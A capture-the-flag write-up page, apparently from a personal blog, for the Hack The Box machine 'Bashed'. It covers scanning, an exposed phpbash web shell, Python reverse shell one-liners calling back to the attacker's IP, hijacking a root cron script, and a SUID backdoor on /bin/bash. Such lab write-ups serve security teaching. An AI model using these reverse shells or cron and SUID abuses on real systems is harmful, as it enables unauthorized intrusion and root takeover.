@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>Bashed | appl3b0y</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@400;700&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="/css/style.min.6c024fd1ea3c339881f761adeb94e0bb6c3d59fa6bec27d058aba9f4cc9e7e31.css" integrity="sha256-bAJP0eo8M5iB92Gt65Tgu2w9Wfpr7CfQWKup9MyefjE=" crossorigin="anonymous">
+
+        <script src="/js/main.8689c693cfce655ed1db63aba8831932920b4e15d870309d7c5f473a07eccaf2.js" integrity="sha256-honGk8/OZV7R22OrqIMZMpILThXYcDCdfF9HOgfsyvI=" crossorigin="anonymous"></script>
+
+
+</head>
+<body>
+  <header>
+    <nav class="main-nav" id="main-nav">
+  <div class="nav-content-wrapper">
+    <a href="https://appl3b0y.github.io/" class="brand">root@appl3b0y</a>
+    <button class="hamburger" id="hamburger">
+      <span class="hamburger-box">
+        <span class="hamburger-inner"></span>
+      </span>
+    </button>
+    <ul class="nav-links">
+  <li>
+    <a href="/writeups/" class="is-active">
+      /writeups
+    </a>
+  </li>
+  <li>
+    <a href="/blog/" class="">
+      blog
+    </a>
+  </li>
+</ul>
+
+  </div>
+</nav>
+
+  </header>
+  <main>
+    
+<div class="writeup-container">
+  
+  <header class="writeup-header">
+    <h1 class="writeup-title">Bashed</h1>
+    
+    <div class="writeup-meta-row">
+      <span class="meta-date">Feb 04, 2026</span>
+      
+        <span class="difficulty-tag easy">Easy</span>
+      
+    </div>
+
+    <div class="tags-container">
+      
+        <a href="/tags/htb" class="tag-badge">#HTB</a>
+      
+        <a href="/tags/linux" class="tag-badge">#linux</a>
+      
+        <a href="/tags/easy" class="tag-badge">#easy</a>
+      
+        <a href="/tags/webshell" class="tag-badge">#webshell</a>
+      
+        <a href="/tags/sudo" class="tag-badge">#sudo</a>
+      
+        <a href="/tags/cronjob" class="tag-badge">#cronjob</a>
+      
+        <a href="/tags/suid" class="tag-badge">#suid</a>
+      
+        <a href="/tags/python" class="tag-badge">#python</a>
+      
+    </div>
+  </header>
+
+  
+  <aside class="writeup-sidebar">
+    <div class="toc-container">
+      <h4 class="toc-title">Index</h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#service-discovery">Service Discovery</a></li>
+        <li><a href="#web-enumeration">Web Enumeration</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#alternative-method-suid-persistence">Alternative Method: SUID Persistence</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  </aside>
+
+  
+  <article class="writeup-post">
+    <div class="content-body">
+      <h2 id="introduction">Introduction</h2>
+<p>Welcome to this technical breakdown of <strong>Bashed</strong>, an introductory Linux machine. In this session, I will demonstrate how <strong>meticulous enumeration</strong> is the key to a successful compromise.</p>
+<p>The core of this challenge is a common development error: leaving a <strong>publicly accessible web shell</strong> on the server. In real-world scenarios, these administrative tools are direct gateways for an attacker to gain control over an internal network.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>I began by mapping the target IP to <code>bashed.htb</code> in my local <code>/etc/hosts</code> file. This is a standard step that makes it easier to interact with the target and helps in finding potential Virtual Hosts.</p>
+<div class="code-block-container">
+  <div class="code-block-header">
+    <span class="code-block-lang">BASH</span>
+  </div>
+  <div class="code-block-content">
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;&lt;target_ip&gt;  bashed.htb&#34;</span> | sudo tee -a /etc/hosts</span></span></code></pre></div>
+  </div>
+</div>
+<h3 id="service-discovery">Service Discovery</h3>
+<p>I used a two-step approach for network scanning: starting fast to get quick results, then performing a deep scan to ensure nothing was hidden.</p>
+<div class="code-block-container">
+  <div class="code-block-header">
+    <span class="code-block-lang">BASH</span>
+  </div>
+  <div class="code-block-content">
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># Quick scan for common ports</span>
+</span></span><span style="display:flex;"><span>sudo nmap --min-rate <span style="color:#bd93f9">5000</span> -n bashed.htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Full scan of all 65,535 TCP ports</span>
+</span></span><span style="display:flex;"><span>sudo nmap -p- --min-rate <span style="color:#bd93f9">5000</span> -n bashed.htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Scan for top UDP services</span>
+</span></span><span style="display:flex;"><span>sudo nmap -sU --top-ports <span style="color:#bd93f9">1000</span> -n bashed.htb</span></span></code></pre></div>
+  </div>
+</div>
+<blockquote>
+<p><em>Note: I used <code>--min-rate 5000</code> to speed up the process. This is safe in a controlled lab environment where we don&rsquo;t need to worry about being stealthy.</em></p>
+</blockquote>
+<p>The initial scans showed that only <strong>port 80/TCP</strong> was open. Since this was the only entry point, I ran a detailed Nmap scan with default scripts and version detection to learn more about the web server.</p>
+<div class="code-block-container">
+  <div class="code-block-header">
+    <span class="code-block-lang">BASH</span>
+  </div>
+  <div class="code-block-content">
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># Detailed script and version scan on port 80</span>
+</span></span><span style="display:flex;"><span>sudo nmap -p80 -sV -sC --min-rate <span style="color:#bd93f9">5000</span> -n bashed.htb -oA scan_results
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Results</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.18 <span style="color:#ff79c6">((</span>Ubuntu<span style="color:#ff79c6">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: Arrexel&#39;s Development Site
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span></span></span></code></pre></div>
+  </div>
+</div>
+<p>The results confirmed an Apache web server. At this point, I shifted my entire focus to the web application.</p>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>I visited the website and found a blog where the author, <strong>Jenn Marshall</strong>, discusses a tool called <code>phpbash</code>. Crucially, she mentions that she developed this web-based terminal on this very server.</p>
+<p><img src="bashed.png" alt="Bashed Homepage"></p>
+<h4 id="static-and-dynamic-analysis">Static and Dynamic Analysis</h4>
+<p>I used two methods to map the application: manual review and automated fuzzing.</p>
+<p><strong>1. Source Code Review:</strong>
+Inspecting the HTML source code often reveals hidden paths. I noticed a reference to an <code>/images</code> directory. When I accessed it, I found that <strong>Directory Listing</strong> was enabled, meaning the server shows a list of files instead of a web page. This is a clear sign of poor security configuration.</p>
+<p><strong>2. Automated Fuzzing:</strong>
+To find hidden development folders, I used <strong>ffuf</strong> for directory discovery.</p>
+<div class="code-block-container">
+  <div class="code-block-header">
+    <span class="code-block-lang">BASH</span>
+  </div>
+  <div class="code-block-content">
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># Directory Fuzzing</span>
+</span></span><span style="display:flex;"><span>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://bashed.htb/FUZZ --ic</span></span></code></pre></div>
+  </div>
+</div>
+<p>The scan discovered a <code>/dev</code> directory. Given that this is a &ldquo;development site&rdquo; this was a high-priority lead.</p>
+<h4 id="the-breakthrough">The Breakthrough</h4>
+<p>Accessing <code>http://bashed.htb/dev/</code> showed that directory listing was also enabled here. Inside, I found <code>phpbash.php</code>. Opening this file gave me a functional <strong>web shell</strong> directly in my browser, granting me command execution as the <code>www-data</code> user.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>After securing the user flag, I turned my attention to escalating privileges. A common first step in internal enumeration is checking <code>sudo</code> permissions. Running <code>sudo -l</code> revealed a significant misconfiguration:</p>
+<div class="code-block-container">
+  <div class="code-block-header">
+    <span class="code-block-lang">BASH</span>
+  </div>
+  <div class="code-block-content">
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@bashed:/var/www/html/dev# sudo -l
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User www-data may run the following commands on bashed:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">(</span>scriptmanager : scriptmanager<span style="color:#ff79c6">)</span> NOPASSWD: ALL</span></span></code></pre></div>
+  </div>
+</div>
+<p>The output indicates that the <code>www-data</code> user is allowed to run any command as the user <code>scriptmanager</code> without requiring a password. This is a powerful privilege, but it comes with a technical limitation: standard <code>sudo</code> commands often require an interactive terminal (TTY) to function correctly. The simple web shell I was using does not support this interactivity, meaning a direct <code>sudo</code> command would likely fail or hang.</p>
+<p>To overcome this, I needed to establish a stable <strong>reverse shell</strong> connection back to my attacking machine. This would provide a proper environment to execute the privilege escalation command.</p>
+<p>I started a listener on my machine:</p>
+<div class="code-block-container">
+  <div class="code-block-header">
+    <span class="code-block-lang">BASH</span>
+  </div>
+  <div class="code-block-content">
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#bd93f9">4444</span></span></span></code></pre></div>
+  </div>
+</div>
+<p>Then, I executed a Python reverse shell payload from the web shell to connect back to my listener:</p>
+<div class="code-block-container">
+  <div class="code-block-header">
+    <span class="code-block-lang">PYTHON</span>
+  </div>
+  <div class="code-block-content">
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#ff79c6">-</span>c <span style="color:#f1fa8c">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;your_ip&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/bash&#34;)&#39;</span></span></span></code></pre></div>
+  </div>
+</div>
+<p>Upon catching the shell, I performed a &ldquo;TTY upgrade&rdquo; to stabilize it. This process enables features like tab completion, command history, and clear screen, effectively simulating a real SSH session:</p>
+<div class="code-block-container">
+  <div class="code-block-header">
+    <span class="code-block-lang">BASH</span>
+  </div>
+  <div class="code-block-content">
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#f1fa8c">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># CTRL+Z</span>
+</span></span><span style="display:flex;"><span>stty raw -echo; <span style="color:#8be9fd;font-style:italic">fg</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">TERM</span><span style="color:#ff79c6">=</span>xterm</span></span></code></pre></div>
+  </div>
+</div>
+<p>With a fully interactive shell secured, I could now successfully switch to the <code>scriptmanager</code> user:</p>
+<div class="code-block-container">
+  <div class="code-block-header">
+    <span class="code-block-lang">BASH</span>
+  </div>
+  <div class="code-block-content">
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -u scriptmanager /bin/bash</span></span></code></pre></div>
+  </div>
+</div>
+<p>As <code>scriptmanager</code>, I began exploring the filesystem for non-standard files. I discovered a directory called <code>/scripts</code> located at the system root, which is highly unusual.</p>
+<div class="code-block-container">
+  <div class="code-block-header">
+    <span class="code-block-lang">BASH</span>
+  </div>
+  <div class="code-block-content">
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scriptmanager@bashed:/scripts$ ls -al
+</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">16</span>
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#bd93f9">1</span> scriptmanager scriptmanager   <span style="color:#bd93f9">58</span> Dec  <span style="color:#bd93f9">4</span>  <span style="color:#bd93f9">2017</span> test.py
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#bd93f9">1</span> root          root            <span style="color:#bd93f9">12</span> Feb  <span style="color:#bd93f9">4</span> 10:15 test.txt</span></span></code></pre></div>
+  </div>
+</div>
+<p>Listing the directory contents revealed a critical vulnerability chain:</p>
+<ol>
+<li><code>test.py</code> is owned by <strong>scriptmanager</strong> (me), meaning I can modify it.</li>
+<li><code>test.txt</code> is owned by <strong>root</strong>, meaning only root could have created or modified it.</li>
+<li>The timestamp on <code>test.txt</code> updates every minute.</li>
+</ol>
+<p>These facts strongly suggested that a <strong>cronjob</strong> (scheduled task) running as root executes the <code>test.py</code> script every minute. Since I can edit <code>test.py</code>, I can effectively inject any code I want, and the root user will unknowingly execute it.</p>
+<p>To exploit this, I replaced the harmless content of <code>test.py</code> with a malicious Python reverse shell:</p>
+<div class="code-block-container">
+  <div class="code-block-header">
+    <span class="code-block-lang">PYTHON</span>
+  </div>
+  <div class="code-block-content">
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> socket<span style="color:#ff79c6">,</span>subprocess<span style="color:#ff79c6">,</span>os
+</span></span><span style="display:flex;"><span>s<span style="color:#ff79c6">=</span>socket<span style="color:#ff79c6">.</span>socket(socket<span style="color:#ff79c6">.</span>AF_INET,socket<span style="color:#ff79c6">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff79c6">.</span>connect((<span style="color:#f1fa8c">&#34;your_ip&#34;</span>,<span style="color:#bd93f9">4445</span>))
+</span></span><span style="display:flex;"><span>os<span style="color:#ff79c6">.</span>dup2(s<span style="color:#ff79c6">.</span>fileno(),<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>os<span style="color:#ff79c6">.</span>dup2(s<span style="color:#ff79c6">.</span>fileno(),<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>os<span style="color:#ff79c6">.</span>dup2(s<span style="color:#ff79c6">.</span>fileno(),<span style="color:#bd93f9">2</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> pty
+</span></span><span style="display:flex;"><span>pty<span style="color:#ff79c6">.</span>spawn(<span style="color:#f1fa8c">&#34;sh&#34;</span>)</span></span></code></pre></div>
+  </div>
+</div>
+<p>I set up a new listener on port 4445 to catch the root connection. After waiting for the next minute cycle, the cronjob executed my modified script, and I received a callback shell with <strong>root privileges</strong>.</p>
+<h3 id="alternative-method-suid-persistence">Alternative Method: SUID Persistence</h3>
+<p>An alternative method to obtain root access involves abusing the cronjob to modify system permissions rather than establishing a new network connection. By instructing the root user to enable the <strong>SUID bit</strong> on the system bash binary (<code>/bin/bash</code>), we can create a persistent backdoor.</p>
+<p>I modified <code>test.py</code> with the following command:</p>
+<div class="code-block-container">
+  <div class="code-block-header">
+    <span class="code-block-lang">PYTHON</span>
+  </div>
+  <div class="code-block-content">
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> os
+</span></span><span style="display:flex;"><span>os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#34;chmod u+s /bin/bash&#34;</span>)</span></span></code></pre></div>
+  </div>
+</div>
+<p>When the cronjob executes, it applies the &ldquo;Set User ID&rdquo; (SUID) bit to the bash executable. This special permission allows any user to execute the file with the privileges of the file&rsquo;s owner, in this case, <strong>root</strong>. Once the task was processed, I could spawn a root shell at any time using the following command:</p>
+<div class="code-block-container">
+  <div class="code-block-header">
+    <span class="code-block-lang">BASH</span>
+  </div>
+  <div class="code-block-content">
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># Executing bash with -p to maintain SUID privileges</span>
+</span></span><span style="display:flex;"><span>bash -p</span></span></code></pre></div>
+  </div>
+</div>
+<blockquote>
+<p><strong>Security Note:</strong> While this technique is highly effective in a <strong>laboratory or CTF environment</strong> for quick access, it is generally avoided in real-world professional engagements. Modifying core system binaries is a destructive action that leaves a permanent and easily detectable footprint. In a production environment, security monitoring tools or an alert administrator would immediately flag the unauthorized permission change on such a critical file.</p>
+</blockquote>
+
+    </div>
+  </article>
+
+  <div class="page-navigation">
+    
+    
+  </div>
+</div>
+
+  </main>
+  <footer>
+    <p>There's no place like 127.0.0.1 // Built with Hugo &amp; Gemini CLI</p>
+
+  </footer>
+</body>
+</html>
